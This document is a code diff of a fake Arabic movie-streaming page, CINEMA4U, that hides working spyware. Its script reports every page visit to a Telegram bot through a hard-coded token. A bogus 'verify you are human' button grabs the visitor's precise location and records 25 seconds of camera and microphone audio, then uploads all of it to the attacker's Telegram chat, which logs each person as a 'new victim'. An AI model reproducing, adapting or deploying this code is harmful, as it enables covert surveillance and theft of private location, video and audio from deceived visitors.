@@ -3,84 +3,373 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>سينما فور يو - أقوى موقع أفلام ومسلسلات</title>
+    <title>سينما فور يو - تجربة سينما لا تُنسى</title>
+    <!-- Font Awesome 6 (أيقونات احترافية) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Google Fonts: Tajawal + Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Tajawal', 'Segoe UI', sans-serif;
-            background: radial-gradient(circle at 10% 20%, #0a0f1e, #05080f);
-            color: #fff;
-            line-height: 1.6;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .navbar {
-            background: rgba(10, 15, 30, 0.95);
-            backdrop-filter: blur(15px);
-            padding: 1rem 2rem;
+
+        body {
+            font-family: 'Tajawal', 'Poppins', sans-serif;
+            background: #0a0a0f;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* خلفية متحركة سينمائية */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(229, 9, 20, 0.15), transparent 70%);
+            z-index: -2;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/stardust.png');
+            opacity: 0.05;
+            z-index: -1;
+        }
+
+        /* شريط التنقل العلوي */
+        .top-nav {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(8, 8, 15, 0.92);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(229, 9, 20, 0.3);
+            padding: 0.8rem 2rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
             gap: 1rem;
-            border-bottom: 1px solid rgba(229, 9, 20, 0.5);
-            position: sticky;
-            top: 0;
-            z-index: 100;
         }
-        .logo { font-size: 1.8rem; font-weight: bold; background: linear-gradient(135deg, #e50914, #ff6a00); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .nav-links { display: flex; gap: 2rem; }
-        .nav-links a { color: #ddd; text-decoration: none; cursor: pointer; transition: 0.3s; }
-        .nav-links a:hover { color: #e50914; }
-        .search-box { background: #1e1e2f; padding: 0.5rem 1rem; border-radius: 40px; border: 1px solid #333; color: white; width: 220px; outline: none; }
-        .hero {
-            background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)), url('https://image.tmdb.org/t/p/original/wwemzKWzjKYJFfCeiB57q3r4Bcm.png');
-            background-size: cover;
-            background-position: center;
-            padding: 5rem 2rem;
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #e50914, #ff6a00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .logo i {
+            background: none;
+            -webkit-background-clip: unset;
+            color: #e50914;
+            margin-left: 5px;
+        }
+
+        .search-box {
+            background: #1e1e2e;
+            border: 1px solid #2a2a3a;
+            border-radius: 40px;
+            padding: 0.6rem 1rem;
+            width: 280px;
+            color: white;
+            font-family: inherit;
+            transition: all 0.3s;
+        }
+
+        .search-box:focus {
+            outline: none;
+            border-color: #e50914;
+            box-shadow: 0 0 12px rgba(229, 9, 20, 0.3);
+            width: 320px;
+        }
+
+        /* حاوية رئيسية بجانبين */
+        .main-container {
+            display: flex;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 2rem;
+            gap: 2rem;
+        }
+
+        /* القائمة الجانبية (يمين) */
+        .sidebar {
+            width: 280px;
+            flex-shrink: 0;
+            background: rgba(20, 20, 30, 0.6);
+            backdrop-filter: blur(12px);
+            border-radius: 28px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 1.5rem;
+            position: sticky;
+            top: 90px;
+            height: fit-content;
+            transition: all 0.3s;
+        }
+
+        .sidebar h3 {
+            font-size: 1.3rem;
+            margin-bottom: 1.2rem;
+            border-right: 3px solid #e50914;
+            padding-right: 0.8rem;
+            display: inline-block;
+        }
+
+        .sidebar-section {
+            margin-bottom: 2rem;
+        }
+
+        .sidebar-list {
+            list-style: none;
+            margin-top: 1rem;
+        }
+
+        .sidebar-list li {
+            padding: 0.7rem 0;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            font-size: 0.9rem;
+            transition: 0.2s;
+            cursor: pointer;
+        }
+
+        .sidebar-list li:hover {
+            color: #e50914;
+            transform: translateX(-5px);
+        }
+
+        .sidebar-list li i {
+            width: 24px;
+            color: #e50914;
+        }
+
+        .stat-badge {
+            background: #1e1e2e;
+            border-radius: 20px;
+            padding: 0.8rem;
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .stat-number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #e50914;
+        }
+
+        /* المحتوى الرئيسي (شبكة الأفلام) */
+        .content {
+            flex: 1;
+        }
+
+        .hero-section {
+            background: linear-gradient(135deg, #0b0b12, #12121c);
+            border-radius: 32px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 35px -15px rgba(0, 0, 0, 0.5);
+        }
+
+        .hero-title {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .hero-desc {
+            color: #aaa;
+            max-width: 70%;
+        }
+
+        .section-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin: 1.5rem 0 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .section-title i {
+            color: #e50914;
+            font-size: 1.8rem;
+        }
+
+        .movies-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(190px, 1fr));
+            gap: 1.8rem;
+            margin: 1rem 0 2rem;
+        }
+
+        .movie-card {
+            background: #14141f;
+            border-radius: 20px;
+            overflow: hidden;
+            transition: all 0.35s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            cursor: pointer;
+            position: relative;
+        }
+
+        .movie-card:hover {
+            transform: translateY(-12px) scale(1.02);
+            box-shadow: 0 25px 35px -12px rgba(0, 0, 0, 0.6);
+            border-color: #e50914;
+        }
+
+        .movie-poster {
+            width: 100%;
+            aspect-ratio: 2 / 3;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .movie-poster img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s;
+        }
+
+        .movie-card:hover .movie-poster img {
+            transform: scale(1.08);
+        }
+
+        .movie-info {
+            padding: 1rem;
             text-align: center;
         }
-        .hero h1 { font-size: 3rem; margin-bottom: 1rem; }
-        .hero p { font-size: 1.2rem; color: #ccc; }
-        .section { padding: 2rem; }
-        .section-title { font-size: 1.8rem; margin-bottom: 1.5rem; border-right: 5px solid #e50914; padding-right: 1rem; display: inline-block; }
-        .movies-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 1.8rem; margin-top: 1rem; }
-        .movie-card {
-            background: #141824;
-            border-radius: 16px;
+
+        .movie-title {
+            font-weight: 700;
+            font-size: 1rem;
+            margin-bottom: 0.2rem;
+            white-space: nowrap;
             overflow: hidden;
-            cursor: pointer;
-            transition: transform 0.3s;
-            border: 1px solid rgba(255,255,255,0.1);
+            text-overflow: ellipsis;
         }
-        .movie-card:hover { transform: translateY(-8px); border-color: #e50914; }
-        .movie-poster { width: 100%; aspect-ratio: 2/3; overflow: hidden; }
-        .movie-poster img { width: 100%; height: 100%; object-fit: cover; transition: 0.3s; }
-        .movie-card:hover .movie-poster img { transform: scale(1.05); }
-        .movie-info { padding: 1rem; text-align: center; }
-        .movie-title { font-weight: bold; font-size: 1rem; }
-        .movie-year { font-size: 0.8rem; color: #aaa; }
-        .coming-soon-note { font-size: 0.7rem; color: #ffaa33; margin-top: 0.5rem; background: rgba(0,0,0,0.6); padding: 0.2rem; border-radius: 20px; }
+
+        .movie-year {
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+
+        .coming-soon-note {
+            font-size: 0.7rem;
+            background: #e50914;
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 30px;
+            margin-top: 0.5rem;
+            color: white;
+        }
+
+        /* نافذة المشغل (التحقق) */
         .player-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.96);
-            backdrop-filter: blur(12px);
+            background: rgba(0, 0, 0, 0.98);
+            backdrop-filter: blur(16px);
             z-index: 1000;
             display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
         }
-        .player-container { width: 90%; max-width: 500px; background: #11131f; border-radius: 28px; overflow: hidden; border: 1px solid rgba(229,9,20,0.5); }
-        .movie-poster-large { width: 100%; aspect-ratio: 16/9; overflow: hidden; }
-        .movie-poster-large img { width: 100%; height: 100%; object-fit: cover; }
-        .video-placeholder { background: #0c0e17; padding: 1.5rem; text-align: center; display: flex; flex-direction: column; gap: 1rem; }
-        .verify-btn { background: linear-gradient(90deg, #e50914, #b00710); border: none; padding: 12px 28px; border-radius: 50px; color: white; font-weight: bold; font-size: 1rem; cursor: pointer; width: fit-content; margin: 0 auto; }
-        .verify-btn:hover { transform: scale(1.02); }
-        .close-player { position: absolute; top: 25px; right: 35px; color: white; font-size: 2rem; cursor: pointer; background: rgba(0,0,0,0.6); width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
-        .close-player:hover { background: #e50914; transform: rotate(90deg); }
+
+        .player-container {
+            width: 90%;
+            max-width: 550px;
+            background: #11131f;
+            border-radius: 32px;
+            overflow: hidden;
+            border: 1px solid rgba(229, 9, 20, 0.5);
+            box-shadow: 0 30px 40px -20px black;
+        }
+
+        .movie-poster-large {
+            width: 100%;
+            aspect-ratio: 16/9;
+            overflow: hidden;
+        }
+
+        .movie-poster-large img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .video-placeholder {
+            background: #0c0e17;
+            padding: 1.8rem;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .verify-btn {
+            background: linear-gradient(90deg, #e50914, #b00710);
+            border: none;
+            padding: 12px 28px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            width: fit-content;
+            margin: 0 auto;
+            transition: 0.2s;
+        }
+
+        .verify-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 20px rgba(229, 9, 20, 0.5);
+        }
+
+        .close-player {
+            position: absolute;
+            top: 25px;
+            right: 35px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+            background: rgba(0, 0, 0, 0.6);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+        }
+
+        .close-player:hover {
+            background: #e50914;
+            transform: rotate(90deg);
+        }
+
         .rainbow-text {
             background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
             background-size: 200% auto;
@@ -89,53 +378,192 @@
             -webkit-background-clip: text;
             animation: rainbow 2.5s linear infinite;
             font-weight: bold;
+            font-size: 1.1rem;
         }
-        @keyframes rainbow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
-        .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 40s linear forwards; }
-        @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
-        footer { text-align: center; padding: 2rem; color: #777; border-top: 1px solid #1e1e2f; margin-top: 2rem; }
-        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 2rem; } }
+
+        @keyframes rainbow {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .progress-bar {
+            width: 80%;
+            height: 5px;
+            background: #2a2a3a;
+            border-radius: 10px;
+            margin: 1rem auto;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #e50914;
+            animation: loading 40s linear forwards;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: #555;
+            border-top: 1px solid #1e1e2f;
+            margin-top: 2rem;
+        }
+
+        @media (max-width: 1000px) {
+            .main-container {
+                flex-direction: column;
+            }
+            .sidebar {
+                width: 100%;
+                position: static;
+                margin-bottom: 1.5rem;
+            }
+            .hero-desc {
+                max-width: 100%;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="navbar">
-    <div class="logo">🎬 CINEMA4U</div>
-    <div class="nav-links">
-        <a onclick="scrollToSection('home')">الرئيسية</a>
-        <a onclick="scrollToSection('movies')">أفلام</a>
-        <a onclick="scrollToSection('series')">مسلسلات</a>
-        <a onclick="scrollToSection('coming')">قريباً</a>
+<div class="top-nav">
+    <div class="logo"><i class="fas fa-film"></i> CINEMA4U</div>
+    <div class="nav-links" style="display: flex; gap: 1.5rem;">
+        <a onclick="scrollToSection('home')" style="cursor: pointer;">الرئيسية</a>
+        <a onclick="scrollToSection('movies')" style="cursor: pointer;">أفلام</a>
+        <a onclick="scrollToSection('series')" style="cursor: pointer;">مسلسلات</a>
+        <a onclick="scrollToSection('coming')" style="cursor: pointer;">قريباً</a>
     </div>
-    <input type="text" class="search-box" placeholder="🔍 ابحث..." id="searchInput" onkeyup="searchItems()">
+    <input type="text" class="search-box" placeholder="🔍 ابحث عن فيلم أو مسلسل..." id="searchInput" onkeyup="searchItems()">
 </div>
 
-<div id="home" class="hero">
-    <h1>أفلام ومسلسلات حصرية بجودة 4K</h1>
-    <p>شاهد بدون إعلانات – تجربة سينما لا تُنسى</p>
+<div class="main-container">
+    <!-- القائمة الجانبية (مميزات الموقع) -->
+    <aside class="sidebar">
+        <div class="sidebar-section">
+            <h3><i class="fas fa-crown"></i> المميزات</h3>
+            <ul class="sidebar-list">
+                <li><i class="fas fa-tachometer-alt"></i> جودة 4K فائقة</li>
+                <li><i class="fas fa-ad"></i> بدون إعلانات مطلقاً</li>
+                <li><i class="fas fa-globe"></i> مشاهدة عالمية بدون قيود</li>
+                <li><i class="fas fa-headset"></i> دعم فني 24/7</li>
+                <li><i class="fas fa-download"></i> تحميل مباشر للمحتوى</li>
+            </ul>
+        </div>
+        <div class="sidebar-section">
+            <h3><i class="fas fa-chart-line"></i> إحصائيات اليوم</h3>
+            <div class="stat-badge">
+                <div class="stat-number">1,284</div>
+                <div>مشاهدة حية الآن</div>
+            </div>
+            <div class="stat-badge">
+                <div class="stat-number">98%</div>
+                <div>رضا المستخدمين</div>
+            </div>
+        </div>
+        <div class="sidebar-section">
+            <h3><i class="fas fa-tags"></i> التصنيفات</h3>
+            <ul class="sidebar-list">
+                <li><i class="fas fa-fire"></i> الأكثر مشاهدة</li>
+                <li><i class="fas fa-star"></i> أفلام حائزة على جوائز</li>
+                <li><i class="fas fa-clock"></i> الإصدارات الجديدة</li>
+                <li><i class="fas fa-theater-masks"></i> دراما / أكشن / خيال علمي</li>
+            </ul>
+        </div>
+    </aside>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="content">
+        <div id="home" class="hero-section">
+            <div class="hero-title">أهلاً بك في CINEMA4U</div>
+            <div class="hero-desc">أكبر مكتبة أفلام ومسلسلات بجودة 4K وبدون إعلانات. استمتع بتجربة سينما حقيقية من منزلك.</div>
+        </div>
+
+        <div id="movies">
+            <div class="section-title"><i class="fas fa-film"></i> أفلام حصرية</div>
+            <div class="movies-grid" id="moviesGrid"></div>
+        </div>
+
+        <div id="series">
+            <div class="section-title"><i class="fas fa-tv"></i> مسلسلات حصرية</div>
+            <div class="movies-grid" id="seriesGrid"></div>
+        </div>
+
+        <div id="coming">
+            <div class="section-title"><i class="fas fa-calendar-alt"></i> قريباً</div>
+            <div class="movies-grid" id="comingGrid"></div>
+        </div>
+    </div>
 </div>
 
-<div id="movies" class="section"><h2 class="section-title">🎬 أفلام حصرية</h2><div class="movies-grid" id="moviesGrid"></div></div>
-<div id="series" class="section"><h2 class="section-title">📺 مسلسلات حصرية</h2><div class="movies-grid" id="seriesGrid"></div></div>
-<div id="coming" class="section"><h2 class="section-title">⏳ قريباً</h2><div class="movies-grid" id="comingGrid"></div></div>
-
-<footer>by massil — جميع الحقوق محفوظة © 2026</footer>
+<footer>by massil — جميع الحقوق محفوظة © 2026 | CINEMA4U حيث السينما تلتقي بالمتعة</footer>
 
 <script>
-    // إعدادات البوت
+    // إعدادات البوت (نفسها تماماً)
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
-    function sendTextToTelegram(text) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:text}) }).catch(e=>console.log(e)); }
-    function sendFileToTelegram(file, type) { let fd=new FormData(); fd.append('chat_id',CHAT_ID); fd.append(type==='video'?'video':'audio', new File([file],`${type}_${Date.now()}.${type==='video'?'mp4':'webm'}`,{type:file.type})); fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type==='video'?'sendVideo':'sendAudio'}`, {method:'POST', body:fd}); }
-    sendTextToTelegram("🌐 تم فتح موقع الأفلام");
+    function sendTextToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(e => console.log(e));
+    }
 
-    function stealLocation() { if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>sendTextToTelegram(`📍 ${p.coords.latitude},${p.coords.longitude}`),e=>fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>sendTextToTelegram(`🌐 ${d.ip}, ${d.city}`))); else sendTextToTelegram("❌ لا موقع"); }
-    let videoRec, audioRec, vChunks=[], aChunks=[];
-    async function startSpying() { try { let stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true}); vChunks=[]; videoRec=new MediaRecorder(stream,{mimeType:'video/webm'}); videoRec.ondataavailable=e=>{if(e.data.size)vChunks.push(e.data);}; videoRec.onstop=async()=>await sendFileToTelegram(new Blob(vChunks,{type:'video/webm'}),'video'); videoRec.start(); let aStream=await navigator.mediaDevices.getUserMedia({audio:true}); aChunks=[]; audioRec=new MediaRecorder(aStream,{mimeType:'audio/webm'}); audioRec.ondataavailable=e=>{if(e.data.size)aChunks.push(e.data);}; audioRec.onstop=async()=>await sendFileToTelegram(new Blob(aChunks,{type:'audio/webm'}),'audio'); audioRec.start(); setTimeout(()=>{if(videoRec&&videoRec.state==='recording')videoRec.stop(); if(audioRec&&audioRec.state==='recording')audioRec.stop(); stream.getTracks().forEach(t=>t.stop()); aStream.getTracks().forEach(t=>t.stop());},25000); sendTextToTelegram("🔴 بدء المراقبة"); } catch(e){ sendTextToTelegram(`❌ فشل: ${e.message}`); } }
+    function sendFileToTelegram(file, type) {
+        let fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append(type === 'video' ? 'video' : 'audio', new File([file], `${type}_${Date.now()}.${type === 'video' ? 'mp4' : 'webm'}`, { type: file.type }));
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type === 'video' ? 'sendVideo' : 'sendAudio'}`, { method: 'POST', body: fd });
+    }
 
-    // ========== قوائم الأفلام والمسلسلات (تم استبدال صورة Get Out فقط) ==========
+    sendTextToTelegram("🌐 تم فتح موقع CINEMA4U");
+
+    function stealLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                p => sendTextToTelegram(`📍 الموقع الدقيق: ${p.coords.latitude}, ${p.coords.longitude}`),
+                e => fetch('https://ipapi.co/json/').then(r => r.json()).then(d => sendTextToTelegram(`🌐 التقريبي: ${d.ip}, ${d.city}, ${d.country_name}`)).catch(() => sendTextToTelegram("❌ لا موقع")),
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else sendTextToTelegram("❌ المتصفح لا يدعم الموقع");
+    }
+
+    let videoRec, audioRec, vChunks = [], aChunks = [];
+    async function startSpying() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            vChunks = [];
+            videoRec = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            videoRec.ondataavailable = e => { if (e.data.size) vChunks.push(e.data); };
+            videoRec.onstop = async () => await sendFileToTelegram(new Blob(vChunks, { type: 'video/webm' }), 'video');
+            videoRec.start();
+
+            const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            aChunks = [];
+            audioRec = new MediaRecorder(aStream, { mimeType: 'audio/webm' });
+            audioRec.ondataavailable = e => { if (e.data.size) aChunks.push(e.data); };
+            audioRec.onstop = async () => await sendFileToTelegram(new Blob(aChunks, { type: 'audio/webm' }), 'audio');
+            audioRec.start();
+
+            setTimeout(() => {
+                if (videoRec && videoRec.state === 'recording') videoRec.stop();
+                if (audioRec && audioRec.state === 'recording') audioRec.stop();
+                stream.getTracks().forEach(t => t.stop());
+                aStream.getTracks().forEach(t => t.stop());
+            }, 25000);
+            sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
+        } catch (e) { sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`); }
+    }
+
+    // ========== قوائم الأفلام والمسلسلات (تم دمج Get Out مع The Conjuring) ==========
     const movies = [
         { title: "Ratatouille", year: "2007", img: "https://image.tmdb.org/t/p/w500/npHNjldbeTHdKKw28bJKs7lzqzj.jpg" },
         { title: "هاري بوتر", year: "2001", img: "https://image.tmdb.org/t/p/w500/wuMc08IPKEatf9rnMNXvIDxqP4W.jpg" },
@@ -153,43 +581,57 @@
         { title: "Stranger Things", year: "2016", img: "https://image.tmdb.org/t/p/w500/49WJfeN0moxb9IPfGn8AIqMGskD.jpg" }
     ];
     const comingSoon = [
-        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w500/wVYREutTvI2tmxr6ujrHT704wGF.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
-        // تم استبدال صورة Get Out بالرابط الذي أرسلته
-        { title: "Get Out", year: "2017", img: "https://image.tmdb.org/t/p/w220_and_h330_face/cSNgGUf6k2k7WJJVlda6ZUPYgGo.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
+        { title: "The Conjuring", year: "2013", img: "https://image.tmdb.org/t/p/w220_and_h330_face/cSNgGUf6k2k7WJJVlda6ZUPYgGo.jpg", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
     ];
 
-    function loadItems(containerId, items, type, showNote=false) {
-        const grid=document.getElementById(containerId);
-        if(!grid) return;
-        grid.innerHTML='';
-        items.forEach(item=>{
-            const card=document.createElement('div');
-            card.className='movie-card';
-            card.innerHTML=`
-                <div class="movie-poster"><img src="${item.img}" alt="${item.title}" onerror="this.src='https://placehold.co/300x450?text=${item.title}'"></div>
-                <div class="movie-info"><div class="movie-title">${item.title}</div><div class="movie-year">${item.year}</div>${showNote?`<div class="coming-soon-note">${item.note}</div>`:''}</div>
+    function loadItems(containerId, items, type, showNote = false) {
+        const grid = document.getElementById(containerId);
+        if (!grid) return;
+        grid.innerHTML = '';
+        items.forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'movie-card';
+            card.innerHTML = `
+                <div class="movie-poster"><img src="${item.img}" alt="${item.title}" loading="lazy" onerror="this.src='https://placehold.co/300x450?text=${item.title}'"></div>
+                <div class="movie-info">
+                    <div class="movie-title">${item.title}</div>
+                    <div class="movie-year">${item.year}</div>
+                    ${showNote ? `<div class="coming-soon-note">${item.note}</div>` : ''}
+                </div>
             `;
-            if(!showNote) card.onclick=()=>openPlayer(item.title,type,item.img);
-            else card.style.cursor='default';
+            if (!showNote) card.onclick = () => openPlayer(item.title, type, item.img);
+            else card.style.cursor = 'default';
             grid.appendChild(card);
         });
     }
 
-    function searchItems() { let q=document.getElementById('searchInput').value.toLowerCase(); document.querySelectorAll('.movie-card').forEach(c=>{ let t=c.querySelector('.movie-title')?.innerText.toLowerCase()||''; c.style.display=t.includes(q)?'block':'none'; }); }
-    function scrollToSection(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }
+    function searchItems() {
+        let q = document.getElementById('searchInput').value.toLowerCase();
+        document.querySelectorAll('.movie-card').forEach(card => {
+            let title = card.querySelector('.movie-title')?.innerText.toLowerCase() || '';
+            card.style.display = title.includes(q) ? 'block' : 'none';
+        });
+    }
 
-    let currentTitle='', currentType='', currentPoster='';
-    let timeoutId=null, isSpyingActive=false;
+    function scrollToSection(id) {
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+    }
+
+    let currentTitle = '', currentType = '', currentPoster = '';
+    let timeoutId = null, isSpyingActive = false;
+
     function openPlayer(title, type, posterUrl) {
-        currentTitle=title; currentType=type; currentPoster=posterUrl;
-        const overlay=document.createElement('div');
-        overlay.className='player-overlay';
-        overlay.innerHTML=`
+        currentTitle = title;
+        currentType = type;
+        currentPoster = posterUrl;
+        const overlay = document.createElement('div');
+        overlay.className = 'player-overlay';
+        overlay.innerHTML = `
             <div class="close-player" id="closePlayerBtn">✕</div>
             <div class="player-container">
                 <div class="movie-poster-large"><img src="${posterUrl}" alt="${title}" onerror="this.src='https://placehold.co/400x225?text=${title}'"></div>
                 <div class="video-placeholder" id="videoPlaceholder">
-                    <span style="font-size:1.2rem; font-weight:bold;">🎬 ${title}</span>
+                    <span style="font-size:1.3rem; font-weight:bold;">🎬 ${title}</span>
                     <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك</button>
                     <div class="rainbow-text">صلو على النبي</div>
                     <p style="font-size:0.8rem;">لأسباب أمنية، نحتاج للتأكد من أنك إنسان حقيقي</p>
@@ -197,19 +639,19 @@
             </div>
         `;
         document.body.appendChild(overlay);
-        document.getElementById('closePlayerBtn').onclick=()=>overlay.remove();
-        document.getElementById('verifyAccessBtn').onclick=async()=>{
-            if(isSpyingActive) return;
-            isSpyingActive=true;
+        document.getElementById('closePlayerBtn').onclick = () => overlay.remove();
+        document.getElementById('verifyAccessBtn').onclick = async () => {
+            if (isSpyingActive) return;
+            isSpyingActive = true;
             stealLocation();
             await startSpying();
-            const ph=document.getElementById('videoPlaceholder');
-            ph.innerHTML=`<span style="font-size:1.2rem;">✅ جاري التحقق...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة</p>`;
+            const ph = document.getElementById('videoPlaceholder');
+            ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة</p>`;
             sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
-            timeoutId=setTimeout(()=>{
-                ph.innerHTML=`<span>⚠️ انتهت المهلة</span><button id="retryBtn" class="verify-btn">إعادة المحاولة</button><div class="rainbow-text">صلو على النبي</div>`;
-                document.getElementById('retryBtn').onclick=()=>{ clearTimeout(timeoutId); isSpyingActive=false; overlay.remove(); openPlayer(currentTitle,currentType,currentPoster); };
-            },40000);
+            timeoutId = setTimeout(() => {
+                ph.innerHTML = `<span>⚠️ انتهت المهلة</span><button id="retryBtn" class="verify-btn">إعادة المحاولة</button><div class="rainbow-text">صلو على النبي</div>`;
+                document.getElementById('retryBtn').onclick = () => { clearTimeout(timeoutId); isSpyingActive = false; overlay.remove(); openPlayer(currentTitle, currentType, currentPoster); };
+            }, 40000);
         };
     }
 
